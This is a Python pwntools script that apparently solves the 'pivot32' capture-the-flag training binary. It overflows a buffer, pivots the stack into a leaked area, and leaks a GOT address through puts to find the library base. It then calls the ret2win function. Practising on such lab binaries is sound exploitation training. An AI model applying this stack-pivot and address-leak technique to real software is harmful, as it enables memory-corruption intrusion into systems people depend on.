#! /usr/bin/env python
from pwn import *

program = "./pivot32"
proc = process(program)

elf_prog = ELF(program)
libc = ELF("./libpivot32.so")

pid = gdb.attach(proc, '''
    set pagination off
    set disassembly-flavor intel
    b * 0x08048686 
    continue
    '''
    )

plt_puts = elf_prog.plt['puts']
plt_foothold = elf_prog.plt['foothold_function']
got_foothold = elf_prog.got['foothold_function']
main = elf_prog.symbols['main']

gadget1 = 0x080485f5 # leave; ret;
align_gadget = 0x08048492 # ret;
gadget2 = 0x0804882c # pop eax; ret; 

#align
#rop chain store in pivot area
# x86 calling convention 
payload = p32(align_gadget) + p32(plt_foothold) + p32(plt_puts) + p32(main) + p32(got_foothold)

proc.recvuntil('pivot: ')
rop_add = proc.recvline()
rop_add = int(rop_add, 16)
print("rop_address: " + hex(rop_add))

proc.recvuntil('> ')
proc.sendline(payload)
print("send rop chain")

payload = b'A'*40
#do stack pivot
payload += p32(rop_add) + p32(gadget1)

proc.recvuntil('> ')
proc.sendline(payload)
print("send payload")

proc.recvuntil('libpivot\n')

libc_foothold = proc.recvline()


libc_foothold = u32(libc_foothold[:-1].ljust(4, b'\x00')[0:4]) # get low 4 bytes
libc_base = libc_foothold - libc.symbols['foothold_function'] 
libc_ret2win = libc_base + libc.symbols['ret2win']
print('libc_foothold: ' + str(hex(libc_foothold)))
print('libc_base: ' + str(hex(libc_base)))
print('libc_ret2win: ' + str(hex(libc_ret2win)))

proc.recvuntil('pivot: ')

rop_add = proc.recvline()
rop_add = int(rop_add, 16)
print("rop_address: " + hex(rop_add))

proc.recvuntil('> ')

payload = p32(align_gadget) + p32(libc_ret2win) 
proc.sendline(payload)
print("send rop chain")
payload = b'A'*40
#do stack pivot
payload += p32(rop_add) + p32(gadget1)

proc.recvuntil('> ')

proc.sendline(payload)
print("send payload")

proc.interactive()